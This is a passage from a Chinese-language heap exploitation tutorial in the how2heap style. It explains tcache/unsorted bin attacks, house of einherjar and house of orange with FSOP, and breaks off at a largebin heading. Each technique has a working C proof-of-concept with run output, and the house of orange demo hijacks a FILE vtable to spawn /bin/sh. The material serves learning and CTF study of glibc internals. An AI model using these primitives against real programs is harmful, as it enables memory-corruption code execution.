0x6020b0:    0x0000000000000000    0x0000000000020f51  <-- top chunk
0x6020c0:    0x0000000000000000    0x0000000000000000
gef➤  x/4gx &stack_var-2
0x7fffffffdc50:    0x00007fffffffdc80    0x0000000000400756  <-- fake chunk
0x7fffffffdc60:    0x00007ffff7dd1b78    0x0000000000602010      <-- fd->TAIL,目标地址已经被修改为unsorted bin头部地址
```

从而泄漏了 unsorted bin 的头部地址。

#### libc 2.27

利用tcache posioning

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    unsigned long stack_var = 0;
    fprintf(stderr, "The target we want to rewrite on stack: %p -> %ld\n\n", &stack_var, stack_var);

    unsigned long *p = malloc(0x80);
    unsigned long *p1 = malloc(0x10);
    fprintf(stderr, "Now, we allocate first small chunk on the heap at: %p\n",p);

    free(p);
    fprintf(stderr, "Freed the first chunk to put it in a tcache bin\n");

    p[0] = (unsigned long)(&stack_var);
    fprintf(stderr, "Overwrite the next ptr with the target address\n");
    malloc(0x80);
    malloc(0x80);
    fprintf(stderr, "Now we malloc twice to make tcache struct's counts '0xff'\n\n");

    free(p);
    fprintf(stderr, "Now free again to put it in unsorted bin\n");
    p[1] = (unsigned long)(&stack_var - 2);
    fprintf(stderr, "Now write its bk ptr with the target address-0x10: %p\n\n", (void*)p[1]);

    malloc(0x80);
    fprintf(stderr, "Finally malloc again to get the chunk at target address: %p -> %p\n", &stack_var, (void*)stack_var);
}
```

```c
$ gcc -g tcache_unsorted_bin_attack.c
$ ./a.out
The target we want to rewrite on stack: 0x7ffef0884c10 -> 0

Now, we allocate first small chunk on the heap at: 0x564866907260
Freed the first chunk to put it in a tcache bin
Overwrite the next ptr with the target address
Now we malloc twice to make tcache struct's counts '0xff'

Now free again to put it in unsorted bin
Now write its bk ptr with the target address-0x10: 0x7ffef0884c00

Finally malloc again to get the chunk at target address: 0x7ffef0884c10 -> 0x7f69ba1d8ca0
```

Tcache Bin 未满 (Count < 7)时，当 `malloc` 从 Unsorted Bin 拿到 chunk 时，它会尝试把 Unsorted Bin 里剩下的同大小 chunk 全部填充进 Tcache。

**后果**：由于我们修改了 `bk` 指针指向栈上的 `target_addr`，glibc 会尝试把 `target_addr` 当作一个 chunk 放入 Tcache。这会触发 chunk 大小检查（`chunksize(victim)`），因为栈上的数据通常不符合 chunk 头部的格式，导致程序崩溃（`memory corruption`）。

```c
      while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
        {
          bck = victim->bk;
          if (__builtin_expect (chunksize_nomask (victim) <= 2 * SIZE_SZ, 0)
              || __builtin_expect (chunksize_nomask (victim)
                   > av->system_mem, 0))
            malloc_printerr ("malloc(): memory corruption");
```

Tcache Bin 不为空：如果对应的 Tcache Bin 里有东西，`malloc` 会直接从 Tcache 取出并在开头返回，根本不会执行到 Unsorted Bin 的逻辑。

后果：无法触发 Unsorted Bin 的 Unlink 操作，攻击失效。

```c
  if (tc_idx < mp_.tcache_bins
      /*&& tc_idx < TCACHE_MAX_BINS*/ /* to appease gcc */
      && tcache
      && tcache->entries[tc_idx] != NULL)
    {
      return tcache_get (tc_idx);
    }
```

为了绕过这个矛盾检查，我们采取通过tcache poisoning的方式将tcache的count修改为0xff

```c
free(p);        // 1. p 进入 tcache, count = 1
p[0] = &stack;  // 2. 修改 p->next 指向栈 (Tcache Poisoning)
malloc(0x80);   // 3. 取出 p, count = 0
malloc(0x80);   // 4. 取出 stack, count = -1 (即 0xff 或 0xffff) !!!
```

此时在进行到下面这里时就会进入 else 分支，直接取出 chunk 并返回：

```c
#if USE_TCACHE
          /* Fill cache first, return to user only if cache fills.
         We may return one of these chunks later.  */
          if (tcache_nb
          && tcache->counts[tc_idx] < mp_.tcache_count)
        {
          tcache_put (victim, tc_idx);
          return_cached = 1;
          continue;
        }
          else
        {
#endif
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
```

于是就成功泄露出了 unsorted bin 的头部地址。

### house_of_einherjar

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

int main() {
    uint8_t *a, *b, *d;

    a = (uint8_t*) malloc(0x10);
    int real_a_size = malloc_usable_size(a);
    memset(a, 'A', real_a_size);
    fprintf(stderr, "We allocate 0x10 bytes for 'a': %p\n\n", a);

    size_t fake_chunk[6];
    fake_chunk[0] = 0x80;
    fake_chunk[1] = 0x80;
    fake_chunk[2] = (size_t) fake_chunk;
    fake_chunk[3] = (size_t) fake_chunk;
    fake_chunk[4] = (size_t) fake_chunk;
    fake_chunk[5] = (size_t) fake_chunk;
    fprintf(stderr, "Our fake chunk at %p looks like:\n", fake_chunk);
    fprintf(stderr, "prev_size: %#lx\n", fake_chunk[0]);
    fprintf(stderr, "size: %#lx\n", fake_chunk[1]);
    fprintf(stderr, "fwd: %#lx\n", fake_chunk[2]);
    fprintf(stderr, "bck: %#lx\n", fake_chunk[3]);
    fprintf(stderr, "fwd_nextsize: %#lx\n", fake_chunk[4]);
    fprintf(stderr, "bck_nextsize: %#lx\n\n", fake_chunk[5]);

    b = (uint8_t*) malloc(0xf8);
    int real_b_size = malloc_usable_size(b);
    uint64_t* b_size_ptr = (uint64_t*)(b - 0x8);
    fprintf(stderr, "We allocate 0xf8 bytes for 'b': %p\n", b);
    fprintf(stderr, "b.size: %#lx\n", *b_size_ptr);
    fprintf(stderr, "We overflow 'a' with a single null byte into the metadata of 'b'\n");
    a[real_a_size] = 0;
    fprintf(stderr, "b.size: %#lx\n\n", *b_size_ptr);

    size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);
    *(size_t*)&a[real_a_size-sizeof(size_t)] = fake_size;
    fprintf(stderr, "We write a fake prev_size to the last %lu bytes of a so that it will consolidate with our fake chunk\n", sizeof(size_t));
    fprintf(stderr, "Our fake prev_size will be %p - %p = %#lx\n\n", b-sizeof(size_t)*2, fake_chunk, fake_size);

    fake_chunk[1] = fake_size;
    fprintf(stderr, "Modify fake chunk's size to reflect b's new prev_size\n");

    fprintf(stderr, "Now we free b and this will consolidate with our fake chunk\n");
    free(b);
    fprintf(stderr, "Our fake chunk size is now %#lx (b.size + fake_prev_size)\n", fake_chunk[1]);

    d = malloc(0x10);
    memset(d, 'A', 0x10);
    fprintf(stderr, "\nNow we can call malloc() and it will begin in our fake chunk: %p\n", d);
}

$ gcc -g house_of_einherjar.c
$ ./a.out
We allocate 0x10 bytes for 'a': 0xb31010

Our fake chunk at 0x7ffdb337b7f0 looks like:
prev_size: 0x80
size: 0x80
fwd: 0x7ffdb337b7f0
bck: 0x7ffdb337b7f0
fwd_nextsize: 0x7ffdb337b7f0
bck_nextsize: 0x7ffdb337b7f0

We allocate 0xf8 bytes for 'b': 0xb31030
b.size: 0x101
We overflow 'a' with a single null byte into the metadata of 'b'
b.size: 0x100

We write a fake prev_size to the last 8 bytes of a so that it will consolidate with our fake chunk
Our fake prev_size will be 0xb31020 - 0x7ffdb337b7f0 = 0xffff80024d7b5830

Modify fake chunk's size to reflect b's new prev_size
Now we free b and this will consolidate with our fake chunk
Our fake chunk size is now 0xffff80024d7d6811 (b.size + fake_prev_size)

Now we can call malloc() and it will begin in our fake chunk: 0x7ffdb337b800
```

house-of-einherjar 是一种利用 malloc 来返回一个附近地址的任意指针。它要求有一个单字节溢出漏洞，覆盖掉 next chunk 的 size 字段并清除 `PREV_IN_USE` 标志，然后还需要覆盖 prev_size 字段为 fake chunk 的大小。当 next chunk 被释放时，它会发现前一个 chunk 被标记为空闲状态，然后尝试合并堆块。只要我们精心构造一个 fake chunk，让合并后的堆块范围到 fake chunk 处，那下一次 malloc 将返回我们想要的地址。比起前面所讲过的 poison-null-byte ，更加强大，但是要求的条件也更多一点，比如一个堆信息泄漏。

首先分配一个假设存在 off_by_one 溢出的 chunk a，然后在栈上创建我们的 fake chunk，chunk 大小随意，只要是 small chunk 就可以了：

```c
gef➤  x/8gx a-0x10
0x603000:    0x0000000000000000    0x0000000000000021  <-- chunk a
0x603010:    0x4141414141414141    0x4141414141414141
0x603020:    0x4141414141414141    0x0000000000020fe1  <-- top chunk
0x603030:    0x0000000000000000    0x0000000000000000
gef➤  x/8gx &fake_chunk
0x7fffffffdcb0:    0x0000000000000080    0x0000000000000080  <-- fake chunk
0x7fffffffdcc0:    0x00007fffffffdcb0    0x00007fffffffdcb0
0x7fffffffdcd0:    0x00007fffffffdcb0    0x00007fffffffdcb0
0x7fffffffdce0:    0x00007fffffffddd0    0xffa7b97358729300
```

接下来创建 chunk b，并利用 chunk a 的溢出将 size 字段覆盖掉，清除了 `PREV_INUSE` 标志，chunk b 就会以为前一个 chunk 是一个 free chunk 了：

```c
gef➤  x/8gx a-0x10
0x603000:    0x0000000000000000    0x0000000000000021  <-- chunk a
0x603010:    0x4141414141414141    0x4141414141414141
0x603020:    0x4141414141414141    0x0000000000000100  <-- chunk b
0x603030:    0x0000000000000000    0x0000000000000000
```

原本 chunk b 的 size 字段应该为 0x101，在这里我们选择 malloc(0xf8) 作为 chunk b 也是出于方便的目的，覆盖后只影响了标志位，没有影响到大小。

接下来根据 fake chunk 在栈上的位置修改 chunk b 的 prev_size 字段。计算方法是用 chunk b 的起始地址减去 fake chunk 的起始地址，同时为了绕过检查，还需要将 fake chunk 的 size 字段与 chunk b 的 prev_size 字段相匹配：

```c
gef➤  x/8gx a-0x10
0x603000:    0x0000000000000000    0x0000000000000021  <-- chunk a
0x603010:    0x4141414141414141    0x4141414141414141
0x603020:    0xffff800000605370    0x0000000000000100  <-- chunk b <-- prev_size
0x603030:    0x0000000000000000    0x0000000000000000
gef➤  x/8gx &fake_chunk
0x7fffffffdcb0:    0x0000000000000080    0xffff800000605370  <-- fake chunk <-- size
0x7fffffffdcc0:    0x00007fffffffdcb0    0x00007fffffffdcb0
0x7fffffffdcd0:    0x00007fffffffdcb0    0x00007fffffffdcb0
0x7fffffffdce0:    0x00007fffffffddd0    0xadeb3936608e0600
```

释放 chunk b，这时因为 `PREV_INUSE` 为零，unlink 会根据 prev_size 去寻找上一个 free chunk，并将它和当前 chunk 合并。从 arena 里可以看到：

```c
gef➤  heap arenas
Arena (base=0x7ffff7dd1b20, top=0x7fffffffdcb0, last_remainder=0x0, next=0x7ffff7dd1b20, next_free=0x0, system_mem=0x21000)
```

最后当我们再次 malloc，其返回的地址将是 fake chunk 的地址：

```c
gef➤  x/8gx &fake_chunk
0x7fffffffdcb0:    0x0000000000000080    0x0000000000000021  <-- chunk d
0x7fffffffdcc0:    0x4141414141414141    0x4141414141414141
0x7fffffffdcd0:    0x00007fffffffdcb0    0xffff800000626331
0x7fffffffdce0:    0x00007fffffffddd0    0xbdf40e22ccf46c00
```

### house_of_orange

House of Orange 的利用可以分为三个主要阶段：

1. 修改 Top Chunk 大小，触发 `sysmalloc` 中的 `_int_free`，强行将 Top Chunk 放入 Unsorted Bin（实现无 `free` 释放）。
2. 利用被释放到 Unsorted Bin 的 chunk，修改其bk指针，修改 libc 中的全局变量 `_IO_list_all` 指针。
3. 伪造 `_IO_FILE` 结构体和虚表 (vtable)，通过触发 `malloc` 报错引发 `abort`，最终在 `_IO_flush_all_lockp` 中劫持控制流。

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int winner (char *ptr);

int main() {
    char *p1, *p2;
    size_t io_list_all, *top;

    p1 = malloc(0x400 - 0x10);

    top = (size_t *) ((char *) p1 + 0x400 - 0x10);
    top[1] = 0xc01;

    p2 = malloc(0x1000);
    io_list_all = top[2] + 0x9a8;
    top[3] = io_list_all - 0x10;

    memcpy((char *) top, "/bin/sh\x00", 8);

    top[1] = 0x61;

    _IO_FILE *fp = (_IO_FILE *) top;
    fp->_mode = 0; // top+0xc0
    fp->_IO_write_base = (char *) 2; // top+0x20
    fp->_IO_write_ptr = (char *) 3; // top+0x28

    size_t *jump_table = &top[12]; // controlled memory
    jump_table[3] = (size_t) &winner;
    *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table; // top+0xd8

    malloc(1);
    return 0;
}

int winner(char *ptr) {
    system(ptr);
    return 0;
}
```

```c
$ gcc -g house_of_orange.c
$ ./a.out
*** Error in `./a.out': malloc(): memory corruption: 0x00007f3daece3520 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f3dae9957e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x8213e)[0x7f3dae9a013e]
/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f3dae9a2184]
./a.out[0x4006cc]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f3dae93e830]
./a.out[0x400509]
======= Memory map: ========
00400000-00401000 r-xp 00000000 08:01 919342                             /home/firmy/how2heap/a.out
00600000-00601000 r--p 00000000 08:01 919342                             /home/firmy/how2heap/a.out
00601000-00602000 rw-p 00001000 08:01 919342                             /home/firmy/how2heap/a.out
01e81000-01ec4000 rw-p 00000000 00:00 0                                  [heap]
7f3da8000000-7f3da8021000 rw-p 00000000 00:00 0
7f3da8021000-7f3dac000000 ---p 00000000 00:00 0
7f3dae708000-7f3dae71e000 r-xp 00000000 08:01 398989                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f3dae71e000-7f3dae91d000 ---p 00016000 08:01 398989                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f3dae91d000-7f3dae91e000 rw-p 00015000 08:01 398989                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f3dae91e000-7f3daeade000 r-xp 00000000 08:01 436912                     /lib/x86_64-linux-gnu/libc-2.23.so
7f3daeade000-7f3daecde000 ---p 001c0000 08:01 436912                     /lib/x86_64-linux-gnu/libc-2.23.so
7f3daecde000-7f3daece2000 r--p 001c0000 08:01 436912                     /lib/x86_64-linux-gnu/libc-2.23.so
7f3daece2000-7f3daece4000 rw-p 001c4000 08:01 436912                     /lib/x86_64-linux-gnu/libc-2.23.so
7f3daece4000-7f3daece8000 rw-p 00000000 00:00 0
7f3daece8000-7f3daed0e000 r-xp 00000000 08:01 436908                     /lib/x86_64-linux-gnu/ld-2.23.so
7f3daeef4000-7f3daeef7000 rw-p 00000000 00:00 0
7f3daef0c000-7f3daef0d000 rw-p 00000000 00:00 0
7f3daef0d000-7f3daef0e000 r--p 00025000 08:01 436908                     /lib/x86_64-linux-gnu/ld-2.23.so
7f3daef0e000-7f3daef0f000 rw-p 00026000 08:01 436908                     /lib/x86_64-linux-gnu/ld-2.23.so
7f3daef0f000-7f3daef10000 rw-p 00000000 00:00 0
7ffe8eba6000-7ffe8ebc7000 rw-p 00000000 00:00 0                          [stack]
7ffe8ebee000-7ffe8ebf1000 r--p 00000000 00:00 0                          [vvar]
7ffe8ebf1000-7ffe8ebf3000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
$ whoami
firmy
$ exit
Aborted (core dumped)
```

house of orange是在程序缺少free的时候通过top chunk的扩充机制制造修改后的chunk free进入unsorted bin，以此来泄露libc地址，同时通过unsorted bin attack来修改_IO_list_all指针，通过FSOP来getshell

它要求能够泄漏堆和 libc。我们知道一开始的时候，整个堆都属于 top chunk，每次申请内存时，就从 top chunk 中划出请求大小的堆块返回给用户，于是 top chunk 就越来越小。

当某一次 top chunk 的剩余大小已经不能够满足请求时，就会调用函数 `sysmalloc()` 分配新内存，这时可能会发生两种情况，一种是直接扩充 top chunk，另一种是调用 mmap 分配一块新的 top chunk。具体调用哪一种方法是由申请大小决定的，为了能够使用前一种扩展 top chunk，需要满足以下检查

**大小不足**：伪造的大小必须小于用户请求的大小 + `MINSIZE`。这里 `0xc01 < 0x1000`，满足。

**页对齐**：`Old_Top + Old_Size` 必须是页对齐的（通常是 4K 对齐）。

原 Top 地址通常以 `x00` 结尾，加上 `0xc00` 依然对齐。

**Prev_inuse 位**：Size 的最低位必须为 1 (PREV_INUSE)，防止向前合并。

**最小尺寸**：Size 必须大于 `MINSIZE` (0x10)。



首先分配一个大小为 0x400 的 chunk：

```c
Allocated chunk | PREV_INUSE
Addr: 0x602000
Size: 0x400 (with flag bits: 0x401)

Top chunk | PREV_INUSE
Addr: 0x602400
Size: 0x20c00 (with flag bits: 0x20c01)
```

默认情况下，top chunk 大小为 0x21000，减去 0x400，所以此时的大小为 0x20c00，另外 PREV_INUSE 被设置。

现在通过溢出漏洞，可以修改 top chunk 的数据，于是我们将 size 字段修改为 0xc01。这样就可以满足上面所说的条件：

```c
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x602000
Size: 0x400 (with flag bits: 0x401)

Top chunk | PREV_INUSE
Addr: 0x602400
Size: 0xc00 (with flag bits: 0xc01)
    
pwndbg> x/20gx 0x602400
0x602400:       0x0000000000000000      0x0000000000000c01
0x602410:       0x0000000000000000      0x0000000000000000
```

紧接着，申请一块大内存，此时由于修改后的 top chunk size 不能满足需求，则调用 sysmalloc 的第一种方法扩充 top chunk，结果是在 old_top 后面新建了一个 top chunk 用来存放 new_top，然后将 old_top 释放，即被添加到了 unsorted bin 中：

```c
Allocated chunk | PREV_INUSE
Addr: 0x602000
Size: 0x400 (with flag bits: 0x401)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x602400
Size: 0xbe0 (with flag bits: 0xbe1)
fd: 0x7ffff7bc4b78
bk: 0x7ffff7bc4b78

Allocated chunk
Addr: 0x602fe0
Size: 0x10 (with flag bits: 0x10)	<-- fencepost chunk 1

Allocated chunk | PREV_INUSE
Addr: 0x602ff0
Size: 0x10 (with flag bits: 0x11)	<-- fencepost chunk 2

Allocated chunk
Addr: 0x603000
Size: 0x00 (with flag bits: 0x00)
```

于是就泄漏出了 libc 地址。另外可以看到 old top chunk 被缩小了 0x20，缩小的空间被用于放置 fencepost chunk。此时的堆空间应该是这样的：

```text
+---------------+
|       p1      |
+---------------+
|  old top-0x20 |
+---------------+
|  fencepost 1  |
+---------------+
|  fencepost 2  |
+---------------+
|      ...      |
+---------------+
|       p2      |
+---------------+
|    new top    |
+---------------+
```

根据放入 unsorted bin 中 old top chunk 的 fd/bk 指针，可以推算出 `_IO_list_all` 的地址。然后通过溢出将 old top 的 bk 改写为 `_IO_list_all-0x10`，这样在进行 unsorted bin attack 时，就会将 `_IO_list_all` 修改为 `&unsorted_bin-0x10`：

malloc前：

```c
Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x602400
Size: 0x60 (with flag bits: 0x61)
fd: 0x7ffff7bc4b78
bk: 0x7ffff7bc5510

pwndbg> x/20gx 0x7ffff7bc5510
0x7ffff7bc5510: 0x0000000000000000      0x0000000000000000
0x7ffff7bc5520 <_IO_list_all>:  0x00007ffff7bc5540      0x0000000000000000
```

malloc后：

因为进行了

```c
bck = victim->bk;
unsorted_chunks(av)->bk = bck;
bck->fd = unsorted_chunks(av);    
```

成功修改_IO_list_all为main_arena+88

#### FSOP

FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。 FILE 结构在程序执行 fopen 等函数时会进行创建，并分配在堆中。我们常定义一个指向 FILE 结构的指针来接收这个返回值。FILE结构体是包裹在_IO_FILE_plus中的，两个结构体定义如下：

```c
struct _IO_FILE_plus
{
    _IO_FILE    file;
    IO_jump_t   *vtable;
}
```

```c
struct _IO_FILE {
  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;   /* Current read pointer */
  char* _IO_read_end;   /* End of get area. */
  char* _IO_read_base;  /* Start of putback+get area. */
  char* _IO_write_base; /* Start of put area. */
  char* _IO_write_ptr;  /* Current put pointer. */
  char* _IO_write_end;  /* End of put area. */
  char* _IO_buf_base;   /* Start of reserve area. */
  char* _IO_buf_end;    /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```

进程中的FILE结构会通过_chain域彼此连接形成一个链表，链表头部用全局变量_IO_list_all表示，通过这个值可以遍历所有的FILE结构。包裹_IO_FILE结构的_IO_FILE_plus中，有一个重要的指针vtable，**vtable指向了一系列处理_IO_FILE文件流的函数指针**(修改指针来控制程序流)。实际上所有针对_IO_FILE_的攻击都是通过修改或者伪造vtable中的函数指针来实现的，因为类似fopen，fread，fwrite，printf，exit，malloc_printerr等对文件流进行操作的函数，最终的函数调用路径都会指向_IO_FILE_plus.vtable上的函数指针。

vtable指向的跳转表是一种兼容C++虚函数的实现。当程序对某个流进行操作的时候，会调用该流对应的跳转表中的某个函数，_IO_jump_t 结构体如下所示：

```c
//glibc-2.23 ./libio/libioP.h
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
};
```

house_of_orange.c中通过偏移来确定了io_list_all的值，即main_arena+88与io_list_all的偏移相差0x9a8字节。

```c
io_list_all = top[2] + 0x9a8;
top[3] = io_list_all - 0x10;
```

top在前面被定义为了old top chunk的地址，这里top[2]的值就是unsortedbin中fd指针的值。

top[2]+0x9a8的地址处，就是全局变量_IO_list_all的地址，修改unsortedbin chunk的bk指针为_IO_list_all的值

在本例中，最终实现攻击的大致思路如下：glibc中定义了打印内存报错信息的函数malloc_printerr，malloc_printerr中实际起作用的是__libc_message函数中定义了abort函数，abort函数在中止进程的时候，会调用_IO_flush_all_lockp遍历刷新所有的文件流，然后会调用_IO_FILE_plus.vtable中的_IO_OVERFLOW函数处理_IO_FILE结构体指针fp。我们在堆区伪造一个_IO_FILE_plus结构体，_IO_FILE_plus.vtable中_IO_OVERFLOW的函数指针修改为system函数地址，_IO_FILE结构体0字节偏移处改写为"sh"或者“/bin/sh”，这时候_IO_OVERFLOW(fp,EOF)就相当于调用system("/bin/sh")。

malloc_printerr函数调用链和具体代码实现如下：

```c
malloc_printerr --> __libc_message --> abort --> _IO_flush_all_lockp --> _IO_OVERFLOW
```

malloc_printerr函数定义在malloc.c中，malloc_printerr中真正起作用的函数，是__libc_message，__libc_message函数被定义在libc_fatal.c中。

1. 一般在出现内存错误时，会调用函数 `malloc_printerr()` 打印出错信息，我们顺着代码一直跟踪下去：

   ```c
   static void
   malloc_printerr (int action, const char *str, void *ptr, mstate ar_ptr)
   {
     [...]
     if ((action & 5) == 5)
       __libc_message (action & 2, "%s\n", str);
     else if (action & 1)
       {
         char buf[2 * sizeof (uintptr_t) + 1];
   
         buf[sizeof (buf) - 1] = '\0';
         char *cp = _itoa_word ((uintptr_t) ptr, &buf[sizeof (buf) - 1], 16, 0);
         while (cp > buf)
           *--cp = '0';
   
         __libc_message (action & 2, "*** Error in `%s': %s: 0x%s ***\n",
                         __libc_argv[0] ? : "<unknown>", str, cp);
       }
     else if (action & 2)
       abort ();
   }
   ```

2. 调用 `__libc_message`：

   ```c
   // sysdeps/posix/libc_fatal.c
   /* Abort with an error message.  */
   void
   __libc_message (int do_abort, const char *fmt, ...)
   {
     [...]
     if (do_abort)
       {
         BEFORE_ABORT (do_abort, written, fd);
   
         /* Kill the application.  */
         abort ();
       }
   }
   ```

3. `do_abort` 调用 `fflush`，即 `_IO_flush_all_lockp`：abort()处理进程的时候，会调用_IO_flush_all_lockp遍历刷新所有的文件流，然后会调用_IO_FILE_plus.vtable中的_IO_overflow函数处理_IO_FILE结构体。

   ```c
   // stdlib/abort.c
   #define fflush(s) _IO_flush_all_lockp (0)
   
     if (stage == 1)
       {
         ++stage;
         fflush (NULL);
       }
   ```

   ```c
   // libio/genops.c
   int
   _IO_flush_all_lockp (int do_lock)
   {
     int result = 0;
     struct _IO_FILE *fp;
     int last_stamp;
   
   #ifdef _IO_MTSAFE_IO
     __libc_cleanup_region_start (do_lock, flush_cleanup, NULL);
     if (do_lock)
       _IO_lock_lock (list_all_lock);
   #endif
   
     last_stamp = _IO_list_all_stamp;
     fp = (_IO_FILE *) _IO_list_all;   // 将其覆盖
     while (fp != NULL)
       {
         run_fp = fp;
         if (do_lock)
   	_IO_flockfile (fp);
   
         if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
   #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
   	   || (_IO_vtable_offset (fp) == 0
   	       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
   				    > fp->_wide_data->_IO_write_base))
   #endif
   	   )
   	  && _IO_OVERFLOW (fp, EOF) == EOF)     // 将其修改为 system 函数
   	result = EOF;
   
         if (do_lock)
   	_IO_funlockfile (fp);
         run_fp = NULL;
   
         if (last_stamp != _IO_list_all_stamp)
   	{
   	  /* Something was added to the list.  Start all over again.  */
   	  fp = (_IO_FILE *) _IO_list_all;
   	  last_stamp = _IO_list_all_stamp;
   	}
         else
   	fp = fp->_chain;    // 指向我们指定的区域
       }
   
   #ifdef _IO_MTSAFE_IO
     if (do_lock)
       _IO_lock_unlock (list_all_lock);
     __libc_cleanup_region_end (0);
   #endif
   
     return result;
   }
   ```

   试想一下，如果所有文件流中，有一个_IO_FILE结构体的0字节偏移处被改写为"sh"，将_IO_FILE_plus.vtable中的_IO_overflow函数指针改写为system函数的地址，这时候执行`_IO_OVERFLOW (fp, EOF) == EOF)==>system('/bin/sh\x00')`

   调用abort函数的三种情况，此时可以打FSOP：

   1. libc执行abort时
   2. 执行exit函数
   3. main函数结束返回时

我们已经将_IO_list_all的值改写为main_arena+88，接下来是关键一步：将unsorted bin chunk的size修改为0x61

此时我们进行malloc操作时，由于大小不满足unsorted bin的大小检查，所以会调用abort函数

调用abort函数时会调用 `_IO_flush_all_lockp` 函数，**顺着 `_IO_list_all` 链表，把所有打开的文件流都刷新（flush）一遍**

当 `_IO_flush_all_lockp` 开始工作时，它看到的第一个“文件”是我们劫持的 `main_arena + 88`。`_mode` 字段被解析为正数或负数，当条件不满足刷新时，它会去找**下一个**文件流。

它是怎么找下一个的？通过读取当前文件流的 `_chain` 指针。 在 64 位下，`_chain` 偏移是 `0x68`。 它会读取 `(main_arena + 88) + 0x68`，也就是 **`main_arena + 192`**

最天才的一步来了：main_arena + 192这一位置恰好是堆管理器中 **`0x60` 大小的 Small Bin 的链表头**！

因为我们在触发崩溃前的最后一次操作中，把伪造 Chunk 的 size 改成了 `0x61`。`malloc` 在报错前，刚好顺手把我们这个 Chunk 整理放进了 `0x60` 的 Small Bin 里，于是，`_chain` 完美地指向了我们在堆上伪造的 `_IO_FILE` 结构体

伪造的IOFILE结构体：

```c
偏移      值/作用
0x00:    b'/bin/sh\x00' (原来是 prev_size。这里放 /bin/sh，因为系统会把文件流指针本身作为参数传给 system)
0x08:    0x61 (原来是 size。修改为 0x61，为了利用 0x60 smallbin 的 _chain)
0x10:    随意值 (原来是 fd。这里对漏洞利用无影响)
0x18:    _IO_list_all - 0x10 (原来是 bk。触发 Unsorted Bin Attack 劫持 _IO_list_all)
0x20:    2 (对应 _IO_write_base)
0x28:    3 (对应 _IO_write_ptr。需要满足 _IO_write_ptr > _IO_write_base 才能触发溢出刷新)
... (中间用 0 填充)
0xC0:    0 (对应 _mode。必须填 0 或者负数)
... (中间用 0 填充)
0xD8:    vtable 的地址 (指向下面你伪造的 vtable 区域，通常等于 `heap_base + offset`)
0xE0:    ... 开始伪造 vtable ...
0xE0 + 0x18 (即 0xF8): system_addr (对应 vtable 中的 __overflow 函数指针)
```

```text
当系统读取到我们的 Fake File 时，为了让它执行刷新操作，我们伪造了以下条件：

_mode = 0 (满足 <= 0 的检查)。

_IO_write_ptr = 1 且 _IO_write_base = 0 (满足 ptr > base 的检查，说明有数据需要刷新)。

条件全部满足，系统决定刷新文件。刷新的动作是调用虚表（vtable）里的 __overflow 函数。
由于我们把 vtable 的指针指向了我们自己伪造的区域，并且把 __overflow 的位置填入了 system 的地址。

最后，系统调用 system(fp)。而 fp（文件流的起始地址，也是我们 Chunk 的 user data 起始地址）被我们填入了 /bin/sh\x00。
```

至此成功getshell

### largebin attack

